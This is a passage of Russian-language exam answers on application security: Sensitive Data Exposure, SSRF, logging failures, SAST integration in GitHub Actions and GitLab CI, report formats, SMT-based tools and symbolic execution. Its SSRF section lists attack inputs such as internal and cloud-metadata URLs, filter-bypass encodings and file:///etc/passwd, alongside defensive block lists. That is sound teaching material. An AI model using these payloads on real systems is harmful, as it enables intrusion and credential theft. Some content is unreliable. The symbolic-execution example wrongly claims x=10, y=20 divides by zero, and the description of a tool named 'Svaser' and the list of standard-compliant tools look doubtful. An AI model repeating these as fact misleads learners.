key = secrets.token_bytes(32)  # 256 бит
```

**CWE классификация:**
- **CWE-327** — Use of a Broken or Risky Cryptographic Algorithm
- **CWE-326** — Inadequate Encryption Strength
- **CWE-330** — Use of Insufficiently Random Values

**Меры защиты:**
- Использование современных алгоритмов (AES-256, SHA-256/512)
- Использование проверенных библиотек
- Регулярное обновление криптографических библиотек
- Проверка соответствия стандартам (FIPS, Common Criteria)

---

### 148. Какие уязвимости относятся к категории «Sensitive Data Exposure»?

**Ответ:** Уязвимости категории **Sensitive Data Exposure (Раскрытие чувствительных данных):**

**1. Нешифрованные данные:**
- Хранение паролей в открытом виде
- Передача данных по HTTP вместо HTTPS
- Нешифрованные базы данных

**2. Слабое шифрование:**
- Использование устаревших алгоритмов
- Слабые ключи шифрования
- Небезопасные режимы шифрования

**3. Небезопасное хранение паролей:**
- Хеширование без salt
- Использование MD5/SHA-1 для паролей
- Отсутствие bcrypt/argon2

**4. Раскрытие данных в логах:**
- Логирование паролей
- Логирование токенов
- Логирование кредитных карт

**5. Раскрытие через ответы API:**
- Возврат чувствительных полей
- Детальные сообщения об ошибках
- Отладочная информация в production

**6. Раскрытие в коде:**
- Хардкод секретов в коде
- Коммиты секретов в git
- Раскрытие в исходном коде

**7. Раскрытие через резервные копии:**
- Нешифрованные backup файлы
- Публично доступные backup файлы
- Раскрытие структуры БД

**8. Раскрытие через кэш:**
- Кэширование чувствительных данных
- Кэш доступен неавторизованным пользователям
- Кэш в браузере содержит чувствительные данные

**Примеры:**

```python
# УЯЗВИМО: Передача по HTTP
response = requests.post("http://api.example.com/login",  # HTTP!
                        data={"password": password})

# БЕЗОПАСНО: HTTPS
response = requests.post("https://api.example.com/login",
                        data={"password": password})

# УЯЗВИМО: Логирование паролей
logger.info(f"User {username} logged in with password {password}")

# БЕЗОПАСНО: Не логировать пароли
logger.info(f"User {username} logged in")
```

**Категория OWASP Top 10:**
- **A02:2021 – Cryptographic Failures** (ранее Sensitive Data Exposure)

**Меры защиты:**
- Шифрование данных в покое и при передаче
- Использование сильных алгоритмов шифрования
- Безопасное хеширование паролей
- Маскирование чувствительных данных
- Регулярные аудиты данных

---

### 149. Что такое SSRF и как её предотвратить?

**Ответ:** **SSRF (Server-Side Request Forgery, CWE-918)** — это уязвимость, при которой сервер выполняет HTTP-запросы к произвольным URL, указанным злоумышленником, что позволяет получать доступ к внутренним ресурсам или выполнять запросы от имени сервера.

**Как работает:**

1. Приложение получает URL от пользователя
2. Приложение выполняет запрос к этому URL
3. Злоумышленник указывает внутренний URL или URL к внешнему ресурсу
4. Сервер выполняет запрос, раскрывая внутреннюю сеть

**Типы SSRF:**

**1. Basic SSRF:**
```python
# УЯЗВИМО
url = request.args.get('url')
response = requests.get(url)  # Может запросить внутренние ресурсы
```

**2. Blind SSRF:**
- Результат не возвращается пользователю
- Обнаружение через timing или DNS
- Использование для сканирования сети

**Примеры атак:**

```
# Доступ к внутренним ресурсам
?url=http://localhost/admin
?url=http://127.0.0.1:8080/internal-api
?url=http://169.254.169.254/latest/meta-data/  # AWS metadata

# Обход фильтров
?url=http://127.0.0.1 → ?url=http://127.1 (IPv4 сокращение)
?url=http://localhost → ?url=http://[::1] (IPv6)
?url=http://localhost → ?url=http://0177.0.0.1 (восьмеричная)

# Использование разных протоколов
?url=file:///etc/passwd
?url=gopher://internal-server:8080
?url=dns://internal-server
```

**Последствия:**
- Доступ к внутренним сервисам
- Чтение локальных файлов
- Обход firewall
- Получение cloud metadata (credentials)

**Защита:**

**1. Whitelist разрешённых доменов:**
```python
ALLOWED_DOMAINS = ['api.example.com', 'trusted-service.com']

def safe_request(url):
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    
    # Дополнительные проверки
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Scheme not allowed")
    
    return requests.get(url)
```

**2. Блокировка внутренних адресов:**
```python
import ipaddress

PRIVATE_NETWORKS = [
    ipaddress.IPv4Network('127.0.0.0/8'),
    ipaddress.IPv4Network('10.0.0.0/8'),
    ipaddress.IPv4Network('172.16.0.0/12'),
    ipaddress.IPv4Network('192.168.0.0/16'),
]

def is_internal(host):
    try:
        ip = ipaddress.ip_address(host)
        for network in PRIVATE_NETWORKS:
            if ip in network:
                return True
    except:
        pass
    return host in ['localhost', '0.0.0.0']

def safe_request(url):
    parsed = urlparse(url)
    if is_internal(parsed.hostname):
        raise ValueError("Internal addresses not allowed")
    
    return requests.get(url)
```

**3. Использование разрешённых протоколов:**
```python
ALLOWED_SCHEMES = ['http', 'https']

def safe_request(url):
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError("Scheme not allowed")
    
    return requests.get(url)
```

**4. Использование DNS-резолвинга:**
```python
import socket

def resolve_host(hostname):
    # Резолв DNS перед запросом
    ip = socket.gethostbyname(hostname)
    if is_internal(ip):
        raise ValueError("Resolved to internal IP")
    return ip
```

**Дополнительные меры:**
- Использование ID вместо URL для внутренних запросов
- Изоляция сетевых запросов
- Мониторинг исходящих запросов
- Ограничение redirects

---

### 150. Какие категории OWASP Top 10 (2021) связаны с недостаточным логированием?

**Ответ:** Недостаточное логирование и мониторинг относится к категории **A09:2021 – Security Logging and Monitoring Failures** в OWASP Top 10 (2021).

**Описание категории:**
Эта категория включает недостатки в логировании и мониторинге безопасности, которые затрудняют обнаружение, реагирование и восстановление после инцидентов безопасности.

**Типичные проблемы:**

**1. Отсутствие логирования:**
- Критичные события не логируются
- Отсутствие логирования аутентификации
- Отсутствие логирования доступа к данным

**2. Недостаточное логирование:**
- Логирование только успешных операций
- Отсутствие логирования неудачных попыток
- Недостаточный уровень детализации

**3. Небезопасное логирование:**
- Логирование чувствительных данных (пароли, токены)
- Логи хранятся в незащищённом виде
- Логи доступны неавторизованным пользователям

**4. Недостаточный мониторинг:**
- Отсутствие мониторинга безопасности
- Нет алертов при подозрительной активности
- Отсутствие SIEM-систем

**5. Недостаточное время хранения:**
- Короткое время хранения логов
- Логи удаляются слишком быстро
- Отсутствие архивов логов

**Примеры:**

```python
# УЯЗВИМО: Отсутствие логирования
def login(username, password):
    user = authenticate(username, password)
    if user:
        create_session(user)
    # Нет логирования успешных/неудачных входов

# БЕЗОПАСНО: Логирование
def login(username, password):
    user = authenticate(username, password)
    if user:
        logger.info(f"Successful login: {username} from {request.remote_addr}")
        create_session(user)
    else:
        logger.warning(f"Failed login attempt: {username} from {request.remote_addr}")
        # Alert если слишком много неудачных попыток
```

**Что нужно логировать:**

1. **События аутентификации:**
   - Успешные входы
   - Неудачные попытки входа
   - Выходы из системы
   - Изменение паролей

2. **События авторизации:**
   - Отказы в доступе
   - Попытки доступа к защищённым ресурсам
   - Изменение прав доступа

3. **События доступа к данным:**
   - Чтение чувствительных данных
   - Изменение данных
   - Экспорт данных

4. **Административные действия:**
   - Изменение конфигурации
   - Управление пользователями
   - Изменение политик безопасности

5. **Подозрительная активность:**
   - Множественные неудачные попытки
   - Необычные паттерны доступа
   - Попытки SQL injection, XSS и т.д.

**Меры защиты:**

1. **Комплексное логирование:**
   - Логирование всех критичных событий
   - Использование структурированного логирования
   - Корреляция событий

2. **Безопасное хранение:**
   - Шифрование логов
   - Защита доступа к логам
   - Резервное копирование

3. **Мониторинг:**
   - SIEM-системы
   - Автоматические алерты
   - Дашборды безопасности

4. **Анализ:**
   - Регулярный анализ логов
   - Обнаружение аномалий
   - Инцидент-менеджмент

**Пример безопасного логирования:**

```python
import logging
import json
from datetime import datetime

class SecureLogger:
    def log_security_event(self, event_type, details):
        log_entry = {
            'timestamp': datetime.utcnow().isoformat(),
            'event_type': event_type,
            'user': getattr(request, 'user', 'anonymous'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'details': self.sanitize_details(details)
        }
        logging.info(json.dumps(log_entry))
    
    def sanitize_details(self, details):
        # Удаление чувствительных данных
        sensitive_fields = ['password', 'token', 'credit_card']
        sanitized = details.copy()
        for field in sensitive_fields:
            if field in sanitized:
                sanitized[field] = '***REDACTED***'
        return sanitized

# Использование
logger = SecureLogger()
logger.log_security_event('login_success', {'username': 'user123'})
logger.log_security_event('access_denied', {'resource': '/admin/users'})
```

**Статистика OWASP:**
- Средний взвешенный показатель влияния: 6.9/10
- Встречается в 90% протестированных приложений
- Затрудняет обнаружение и реагирование на атаки

---

## Источники:
- OWASP Top 10 (2021)
- CWE (Common Weakness Enumeration)
- CVE (Common Vulnerabilities and Exposures)
- CVSS (Common Vulnerability Scoring System)
- OWASP Testing Guide
- NIST Vulnerability Database



# Ответы на вопросы к зачёту
## Раздел 7: Инструменты, технологии и интеграции

### 151. Какие языки поддерживает PVS-Studio?

**Ответ:** **PVS-Studio** — статический анализатор кода, который поддерживает следующие языки программирования:

**Основные языки:**
1. **C/C++** — основной фокус инструмента
   - C89, C99, C11, C17
   - C++98, C++03, C++11, C++14, C++17, C++20

2. **C#** — поддержка с версии 7.00
   - .NET Framework
   - .NET Core
   - .NET 5/6/7/8

3. **Java** — поддержка с версии 7.20
   - Java 8, 11, 17, 21

**Платформы:**
- Windows
- Linux
- macOS

**Возможности:**
- Обнаружение более 1000 типов ошибок
- Поддержка IDE (Visual Studio, IntelliJ IDEA, Qt Creator и др.)
- Интеграция с CI/CD (Jenkins, TeamCity, GitLab CI, GitHub Actions)
- Поддержка SARIF для интеграции с другими инструментами
- Межпроцедурный анализ
- Анализ кода на соответствие MISRA, AUTOSAR, CERT

**Особенности:**
- Высокая точность обнаружения уязвимостей
- Низкий уровень false positives
- Поддержка крупных проектов (многие миллионы строк кода)
- Использование анализа потока данных и символьного выполнения

---

### 152. Какие языки поддерживает Svaser?

**Ответ:** **Svaser** — это российский статический анализатор кода, разработанный компанией "Базис". 

**Поддерживаемые языки:**
1. **C/C++** — основная поддержка
2. **Java** — поддержка Java-приложений
3. **C#** — поддержка .NET приложений

**Особенности:**
- Российская разработка
- Соответствие требованиям российских стандартов
- Поддержка ГОСТ Р 71207-2024
- Интеграция с российскими системами разработки
- Поддержка кириллицы в коде и комментариях

**Возможности:**
- Обнаружение уязвимостей безопасности
- Проверка соответствия стандартам кодирования
- Межпроцедурный анализ
- Интеграция с CI/CD
- Поддержка крупных проектов

**Применение:**
- Критически важная информационная инфраструктура (КИИ)
- Государственные системы
- Системы с требованиями к локализации инструментов

---

### 153. Какие инструменты соответствуют требованиям ГОСТ Р 71207–2024?

**Ответ:** Согласно ГОСТ Р 71207–2024 "Статический анализ программного обеспечения", инструменты должны соответствовать следующим требованиям:

**Общие требования:**
1. **Функциональные возможности:**
   - Выполнение статического анализа исходного кода
   - Обнаружение уязвимостей и дефектов
   - Поддержка соответствующих языков программирования

2. **Требования к результатам:**
   - Структурированные результаты анализа
   - Связь с требованиями безопасности (CWE, OWASP)
   - Трассируемость результатов

3. **Требования к точности:**
   - Минимизация false positives
   - Высокая полнота обнаружения (recall)

4. **Требования к интеграции:**
   - Поддержка стандартных форматов (SARIF)
   - Интеграция с системами разработки
   - Возможность автоматизации

**Инструменты, соответствующие требованиям:**

**Российские инструменты:**
1. **Svaser** — российский статический анализатор
2. **PVS-Studio** — поддерживает российские стандарты
3. **Polyspace** (MathWorks) — при наличии сертификации

**Международные инструменты:**
1. **Coverity** (Synopsys) — при соответствии требованиям
2. **Klocwork** (Perforce) — при наличии необходимых функций
3. **CodeSonar** (GrammaTech)
4. **SonarQube** — при правильной настройке

**Критерии соответствия:**
- Поддержка языков, используемых в проекте
- Обнаружение уязвимостей согласно требованиям
- Документирование результатов
- Возможность верификации результатов
- Соответствие требованиям по хранению артефактов

**Примечание:** Для использования в КИИ и государственных системах требуется подтверждение соответствия требованиям ФСТЭК России.

---

### 154. Как интегрировать SAST в GitHub Actions?

**Ответ:** Интеграция SAST в GitHub Actions выполняется через создание workflow файлов (`.github/workflows/security.yml`):

**Пример интеграции:**

```yaml
name: Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 0 * * 0'  # Еженедельное сканирование

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      # Пример с CodeQL
      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: python, javascript
      
      - name: Autobuild
        uses: github/codeql-action/autobuild@v2
      
      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v2
      
      # Пример с SonarQube
      - name: SonarQube Scan
        uses: SonarSource/sonarqube-scan-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
      
      # Пример с Semgrep
      - name: Semgrep Scan
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten
      
      # Пример с Bandit (Python)
      - name: Bandit Security Scan
        run: |
          pip install bandit
          bandit -r . -f json -o bandit-report.json
      
      # Пример с ESLint Security Plugin (JavaScript)
      - name: ESLint Security Scan
        run: |
          npm install eslint-plugin-security
          npx eslint . --ext .js,.jsx
      
      # Загрузка отчётов
      - name: Upload SARIF results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: results.sarif
      
      # Отправка уведомлений при критических уязвимостях
      - name: Notify on critical issues
        if: failure()
        run: |
          echo "Critical vulnerabilities found!"
```

**Интеграция с конкретными инструментами:**

**1. GitHub CodeQL (встроенный):**
```yaml
- name: CodeQL Analysis
  uses: github/codeql-action/analyze@v2
```

**2. SonarQube:**
```yaml
- name: SonarQube Scan
  uses: SonarSource/sonarqube-scan-action@master
```

**3. Semgrep:**
```yaml
- name: Semgrep
  uses: returntocorp/semgrep-action@v1
```

**4. PVS-Studio:**
```yaml
- name: PVS-Studio
  run: |
    pvs-studio-analyzer trace -- make
    pvs-studio-analyzer analyze
    plog-converter -a GA:1,2 -t sarif -o results.sarif PVS-Studio.log
```

**5. Custom SAST инструмент:**
```yaml
- name: Custom SAST
  run: |
    docker run --rm -v $PWD:/src sast-tool /src
    # Загрузка результатов
```

**Security gates:**
```yaml
- name: Check for critical vulnerabilities
  run: |
    if grep -q "CRITICAL" results.sarif; then
      echo "Critical vulnerabilities found!"
      exit 1
    fi
```

---

### 155. Как интегрировать SAST в GitLab CI?

**Ответ:** Интеграция SAST в GitLab CI выполняется через файл `.gitlab-ci.yml`:

**Пример базовой интеграции:**

```yaml
stages:
  - build
  - test
  - security

variables:
  SAST_IMAGE: registry.gitlab.com/security-products/sast:latest

sast:
  stage: security
  image: $SAST_IMAGE
  script:
    - /analyzer run
  artifacts:
    reports:
      sast: gl-sast-report.json
    paths:
      - gl-sast-report.json
    expire_in: 1 week
  allow_failure: false  # Блокировать pipeline при критических уязвимостях
  only:
    - merge_requests
    - main
    - develop
```

**Интеграция с конкретными инструментами:**

**1. GitLab SAST (встроенный):**
```yaml
include:
  - template: Security/SAST.gitlab-ci.yml

sast:
  variables:
    SAST_EXCLUDED_PATHS: "spec, test, tests"
    SAST_ANALYZER_IMAGE_TAG: "3"
```

**2. SonarQube:**
```yaml
sonarqube:
  stage: security
  image: sonarsource/sonar-scanner-cli:latest
  variables:
    SONAR_USER_HOME: "${CI_PROJECT_DIR}/.sonar"
    GIT_DEPTH: "0"
  cache:
    key: "${CI_JOB_NAME}"
    paths:
      - .sonar/cache
  script:
    - sonar-scanner
      -Dsonar.host.url=${SONAR_HOST_URL}
      -Dsonar.login=${SONAR_TOKEN}
      -Dsonar.projectKey=${CI_PROJECT_NAME}
  only:
    - merge_requests
    - main
```

**3. Semgrep:**
```yaml
semgrep:
  stage: security
  image: returntocorp/semgrep:latest
  script:
    - semgrep --config=auto --json --output=semgrep-report.json .
  artifacts:
    reports:
      sast: semgrep-report.json
  allow_failure: false
```

**4. Bandit (Python):**
```yaml
bandit:
  stage: security
  image: python:3.9
  before_script:
    - pip install bandit bandit-sarif-formatter
  script:
    - bandit -r . -f sarif -o bandit-report.sarif
  artifacts:
    reports:
      sast: bandit-report.sarif
```

**5. ESLint Security (JavaScript):**
```yaml
eslint-security:
  stage: security
  image: node:18
  before_script:
    - npm install eslint eslint-plugin-security
  script:
    - npx eslint . --ext .js,.jsx --format json -o eslint-report.json
  artifacts:
    reports:
      sast: eslint-report.json
```

**Многоязычная интеграция:**
```yaml
sast-python:
  stage: security
  extends: .sast-template
  variables:
    SAST_LANGUAGE: python
  script:
    - bandit -r . -f sarif -o python-sast.sarif

sast-javascript:
  stage: security
  extends: .sast-template
  variables:
    SAST_LANGUAGE: javascript
  script:
    - npm audit --json > js-sast.json
```

**Security gates:**
```yaml
check-sast-results:
  stage: security
  script:
    - |
      if grep -q "critical" gl-sast-report.json; then
        echo "Critical vulnerabilities found!"
        exit 1
      fi
```

---

### 156. Как настроить хранение отчётов SAST для аудита?

**Ответ:** Настройка хранения отчётов SAST для аудита включает следующие шаги:

**1. Централизованное хранилище:**

```yaml
# GitHub Actions
- name: Upload reports to artifact storage
  uses: actions/upload-artifact@v3
  with:
    name: sast-reports
    path: |
      reports/*.sarif
      reports/*.json
    retention-days: 90
```

```yaml
# GitLab CI
sast:
  artifacts:
    reports:
      sast: gl-sast-report.json
    paths:
      - reports/
    expire_in: 1 year
    name: "sast-report-$CI_COMMIT_SHORT_SHA"
```

**2. Хранение в объектном хранилище:**

```python
import boto3
from datetime import datetime

def upload_sast_report(report_path, project_name):
    s3 = boto3.client('s3')
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    key = f"sast-reports/{project_name}/{timestamp}/report.sarif"
    
    s3.upload_file(
        report_path,
        'security-audit-bucket',
        key,
        Metadata={
            'project': project_name,
            'timestamp': timestamp,
            'report_type': 'SAST'
        }
    )
```

**3. База данных для хранения метаданных:**

```sql
CREATE TABLE sast_reports (
    id SERIAL PRIMARY KEY,
    project_name VARCHAR(255),
    commit_sha VARCHAR(40),
    report_path VARCHAR(500),
    scan_date TIMESTAMP,
    total_issues INTEGER,
    critical_issues INTEGER,
    high_issues INTEGER,
    tool_name VARCHAR(100),
    version VARCHAR(50)
);
```

**4. Интеграция с SIEM:**

```python
def send_to_siem(report):
    # Отправка в SIEM для анализа и корреляции
    siem_client.send_event({
        'event_type': 'sast_scan',
        'timestamp': datetime.now().isoformat(),
        'project': report['project'],
        'issues': report['issues'],
        'severity': report['severity']
    })
```

**5. Архивирование:**

```bash
#!/bin/bash
# Архивирование старых отчётов
tar -czf "sast-reports-$(date +%Y-%m).tar.gz" reports/
aws s3 cp "sast-reports-$(date +%Y-%m).tar.gz" s3://audit-archive/
```

**6. Соответствие требованиям ГОСТ Р 71207-2024:**

```python
class AuditReportStorage:
    def __init__(self):
        self.storage_path = "/var/audit/sast-reports"
        self.retention_period_days = 365 * 3  # 3 года
    
    def store_report(self, report_data, metadata):
        # Сохранение отчёта
        report_id = generate_uuid()
        report_path = f"{self.storage_path}/{report_id}.sarif"
        
        with open(report_path, 'w') as f:
            json.dump(report_data, f)
        
        # Сохранение метаданных
        self.store_metadata(report_id, metadata)
        
        # Логирование для аудита
        self.audit_log('report_stored', report_id, metadata)
    
    def audit_log(self, action, report_id, details):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'report_id': report_id,
            'user': get_current_user(),
            'details': details
        }
        # Невозможно изменить логи аудита
        self.append_to_audit_log(log_entry)
```

**Требования к хранению:**
- Невозможность изменения отчётов
- Долгосрочное хранение (3+ года)
- Шифрование чувствительных данных
- Контроль доступа
- Регулярное резервное копирование

---

### 157. Какие форматы отчётов поддерживаются (SARIF, CEF и др.)?

**Ответ:** SAST-инструменты поддерживают различные форматы отчётов:

**1. SARIF (Static Analysis Results Interchange Format):**
- **Стандарт:** OASIS стандарт (SARIF 2.1.0)
- **Использование:** Стандартный формат для статического анализа
- **Поддержка:** GitHub, GitLab, большинство SAST-инструментов
- **Преимущества:** Структурированный формат, поддержка трассировки

```json
{
  "version": "2.1.0",
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "runs": [{
    "tool": {
      "driver": {
        "name": "Example Tool",
        "version": "1.0.0"
      }
    },
    "results": [{
      "ruleId": "CWE-89",
      "level": "error",
      "message": {
        "text": "SQL Injection vulnerability"
      },
      "locations": [{
        "physicalLocation": {
          "artifactLocation": {
            "uri": "src/main.py"
          },
          "region": {
            "startLine": 42,
            "startColumn": 10
          }
        }
      }]
    }]
  }]
}
```

**2. CEF (Common Event Format):**
- **Стандарт:** ArcSight
- **Использование:** Интеграция с SIEM-системами
- **Формат:** Key-Value пары

```
CEF:0|Security Tool|SAST|1.0|CWE-89|SQL Injection|8|src=main.py line=42
```

**3. JSON:**
- **Использование:** Универсальный формат
- **Преимущества:** Легко парсится, широко поддерживается

```json
{
  "tool": "bandit",
  "timestamp": "2024-01-15T10:30:00Z",
  "results": [
    {
      "issue_id": "B608",
      "severity": "MEDIUM",
      "file": "app.py",
      "line": 42,
      "description": "SQL injection"
    }
  ]
}
```

**4. XML:**
- **Использование:** Интеграция с Enterprise системами
- **Примеры:** Checkstyle XML, PMD XML

```xml
<?xml version="1.0"?>
<checkstyle>
  <file name="main.py">
    <error line="42" severity="error" message="SQL Injection" source="CWE-89"/>
  </file>
</checkstyle>
```

**5. HTML:**
- **Использование:** Визуализация для разработчиков
- **Преимущества:** Удобное представление результатов

**6. CSV:**
- **Использование:** Импорт в Excel/таблицы
- **Формат:** Простой табличный формат

```csv
Severity,File,Line,Rule ID,Description
ERROR,main.py,42,CWE-89,SQL Injection
```

**7. JUnit XML:**
- **Использование:** Интеграция с CI/CD системами
- **Стандарт:** JUnit test results format

```xml
<?xml version="1.0"?>
<testsuites>
  <testsuite name="Security Scan">
    <testcase name="CWE-89" file="main.py" line="42">
      <failure message="SQL Injection detected"/>
    </testcase>
  </testsuite>
</testsuites>
```

**8. Custom форматы:**
- **SonarQube:** Собственный формат для интеграции
- **CodeSonar:** XML формат с расширенной информацией

**Конвертация форматов:**

```python
import json

def sarif_to_json(sarif_file):
    with open(sarif_file, 'r') as f:
        sarif_data = json.load(f)
    
    # Конвертация в простой JSON
    results = []
    for run in sarif_data.get('runs', []):
        for result in run.get('results', []):
            results.append({
                'rule': result.get('ruleId'),
                'level': result.get('level'),
                'message': result.get('message', {}).get('text'),
                'file': result['locations'][0]['physicalLocation']['artifactLocation']['uri'],
                'line': result['locations'][0]['physicalLocation']['region']['startLine']
            })
    
    return {'issues': results}
```

**Рекомендации:**
- Использовать **SARIF** для стандартизации
- Поддерживать **JSON** для гибкости
- Использовать **CEF** для интеграции с SIEM
- Предоставлять **HTML** для удобства разработчиков

---

### 158. Какие инструменты используют SMT-решатели?

**Ответ:** Инструменты, использующие **SMT (Satisfiability Modulo Theories)** решатели для формальной верификации и статического анализа:

**1. Dafny:**
- **SMT-решатель:** Z3
- **Применение:** Верификация программ
- **Особенности:** Язык с встроенной верификацией

**2. Frama-C:**
- **SMT-решатели:** Z3, Alt-Ergo, CVC4
- **Применение:** Анализ кода на C
- **Особенности:** Доказательство свойств программ

**3. CBMC (Bounded Model Checker):**
- **SMT-решатель:** Z3, Boolector
- **Применение:** Проверка C/C++ программ
- **Особенности:** Модельная проверка с ограничениями

**4. KLEE:**
- **SMT-решатели:** STP, Z3
- **Применение:** Символьное выполнение
- **Особенности:** Автоматическая генерация тестов

**5. SeaHorn:**
- **SMT-решатель:** Z3, Spacer
- **Применение:** Верификация программ
- **Особенности:** Horn clause solving

**6. Infer (Facebook):**
- **SMT-решатель:** Встроенный решатель
- **Применение:** Статический анализ
- **Особенности:** Абстрактная интерпретация

**7. CodeSonar:**
- **SMT-решатели:** Внутренние решатели
- **Применение:** Глубокий статический анализ
- **Особенности:** Межпроцедурный анализ

**8. Z3 (сам по себе):**
- **SMT-решатель:** Z3
- **Применение:** Основа для других инструментов
- **Особенности:** Microsoft Research

**Применение SMT-решателей:**
- Доказательство корректности программ
- Обнаружение невыполнимых путей
- Проверка инвариантов
- Верификация свойств безопасности

---

### 159. Чем Frama-C отличается от KLEE?

**Ответ:** Различия между **Frama-C** и **KLEE**:

**Frama-C:**
- **Подход:** Дедуктивная верификация
- **Метод:** Математические доказательства с использованием SMT-решателей
- **Цель:** Доказательство корректности программ
- **Язык:** C
- **Применение:** Критически важные системы, сертификация
- **Результат:** Доказательство или опровержение свойств
- **Преимущества:** Высокая точность, формальные гарантии
- **Недостатки:** Требует аннотаций, трудоёмкий процесс

**KLEE:**
- **Подход:** Символьное выполнение
- **Метод:** Выполнение программы с символьными значениями
- **Цель:** Обнаружение ошибок и генерация тестов
- **Язык:** LLVM IR (поддерживает C, C++)
- **Применение:** Тестирование, поиск уязвимостей
- **Результат:** Конкретные тест-кейсы и найденные ошибки
- **Преимущества:** Автоматическое тестирование, обнаружение реальных ошибок
- **Недостатки:** Проблемы с масштабируемостью, сложными вычислениями

**Сравнение:**

| Характеристика | Frama-C | KLEE |
|----------------|---------|------|
| Подход | Дедуктивная верификация | Символьное выполнение |
| Цель | Доказательство корректности | Обнаружение ошибок |
| Аннотации | Требуются | Не требуются |
| Тест-кейсы | Не генерирует | Генерирует |
| Формальные гарантии | Да | Нет |
| Масштабируемость | Ограничена | Ограничена |
| Применение | Критические системы | Тестирование |

---

### 160. Какие преимущества у абстрактной интерпретации перед линтерами?

**Ответ:** Преимущества **абстрактной интерпретации** перед простыми линтерами:

**1. Более глубокий анализ:**
- **Абстрактная интерпретация:** Анализирует все возможные пути выполнения программы
- **Линтеры:** Проверяют синтаксические паттерны без понимания семантики

**2. Точность:**
- **Абстрактная интерпретация:** Отслеживает значения переменных и состояния программы
- **Линтеры:** Много false positives из-за поверхностного анализа

**3. Обнаружение сложных ошибок:**
- **Абстрактная интерпретация:** Может найти ошибки, требующие анализа потока данных
- **Линтеры:** Находят только очевидные паттерны

**4. Межпроцедурный анализ:**
- **Абстрактная интерпретация:** Анализирует вызовы функций через границы модулей
- **Линтеры:** Обычно ограничены одним файлом/функцией

**5. Отслеживание состояний:**
- **Абстрактная интерпретация:** Отслеживает абстрактные состояния программы
- **Линтеры:** Не понимают состояние программы

**6. Обнаружение runtime ошибок:**
- **Абстрактная интерпретация:** Может обнаружить деление на ноль, переполнение, null pointer
- **Линтеры:** Не могут обнаружить runtime ошибки без выполнения

**Пример:**

```python
# Абстрактная интерпретация обнаружит:
def divide(a, b):
    if a == b:
        return 100 / (a - b)  # Обнаружит деление на ноль!

# Линтер не обнаружит, так как это требует анализа значений
```

**Недостатки абстрактной интерпретации:**
- Более медленная работа
- Требует больше ресурсов
- Сложнее в настройке

**Когда использовать:**
- **Абстрактная интерпретация:** Критически важные системы, глубокий анализ
- **Линтеры:** Быстрая проверка, стайл-гайды, очевидные ошибки

---

### 161. Что такое символьное выполнение и в чём его ограничения?

**Ответ:** **Символьное выполнение (Symbolic Execution)** — это техника анализа программ, при которой программа выполняется с символьными значениями вместо конкретных входных данных, что позволяет исследовать множество путей выполнения одновременно.

**Как работает:**

1. Переменные представлены символьными выражениями
2. Программа выполняется, создавая ограничения на символьные переменные
3. SMT-решатель проверяет выполнимость ограничений
4. Для каждого выполнимого пути генерируются конкретные входные данные

**Пример:**

```c
int foo(int x, int y) {
    if (x > 0) {
        if (y == x * 2) {
            return 100 / (x - y);  // Деление на ноль при x > 0 и y == 2x
        }
    }
    return 0;
}
```

Символьное выполнение найдёт, что при `x = 10, y = 20` происходит деление на ноль.

**Ограничения:**

**1. Взрывная сложность (State Space Explosion):**
- Количество путей выполнения растёт экспоненциально
- Невозможность анализа больших программ целиком

**2. Сложные вычисления:**
- Проблемы с циклами и рекурсией
- Сложные математические операции
- Внешние зависимости

**3. Ограничения SMT-решателей:**
- Не все выражения разрешимы
- Время решения может быть экспоненциальным
- Ограничения на типы данных

**4. Интерактивные программы:**
- Проблемы с пользовательским вводом
- Системные вызовы
- Сетевое взаимодействие

**5. Неполнота:**
- Не все пути могут быть проанализированы
- Возможны пропущенные ошибки

**Инструменты символьного выполнения:**
- **KLEE** — для LLVM
- **SAGE** — Microsoft Research
- **angr** — Python framework
- **Triton** — binary analysis

**Применение:**
- Автоматическая генерация тестов
- Обнаружение уязвимостей
- Поиск путей к конкретным точкам кода
- Анализ бинарных файлов

---

### 162. Какие подходы используются для снижения false positives?

**Ответ:** Подходы для снижения **false positives** (ложных срабатываний) в статическом анализе:

**1. Межпроцедурный анализ:**
- Анализ вызовов функций через границы модулей
- Отслеживание потока данных через функции
- Более точное понимание контекста

**2. Анализ потока данных (Data Flow Analysis):**
- Отслеживание значений переменных
- Понимание, откуда приходят данные
- Проверка санитизации данных

**3. Контекстно-чувствительный анализ:**
- Учёт контекста использования кода
- Различная обработка в разных контекстах
- Учёт особенностей API

**4. Условный анализ:**
- Учёт условий выполнения
- Исключение невыполнимых путей
- SMT-решатели для проверки условий

**5. Машинное обучение:**
- Обучение на размеченных данных
- Классификация результатов как true/false positive
- Ранжирование по вероятности

**6. Интерактивная верификация:**
- Предоставление дополнительной информации
- Аннотации от разработчиков
- Обратная связь для улучшения анализа

**7. Использование аннотаций:**
```java
@NonNull
String processInput(@Sanitized String input) {
    // Анализатор знает, что input санитизирован
    return input;
}
```

**8. Whitelist известных безопасных паттернов:**
```python
# Игнорирование известных безопасных случаев
if is_known_safe_pattern(code):
    return False  # Не сообщать об этом
```

**9. Статистический анализ:**
- Анализ исторических данных
- Обучение на основе предыдущих результатов
- Фильтрация по частоте ложных срабатываний

**10. Конфигурируемые правила:**
```yaml
rules:
  sql_injection:
    severity: high
    ignore_patterns:
      - "prepared_statement.*"
    require_context:
      - user_input
```

**Метрики качества:**
- **Precision** — процент правильных результатов
- **Recall** — процент найденных реальных проблем
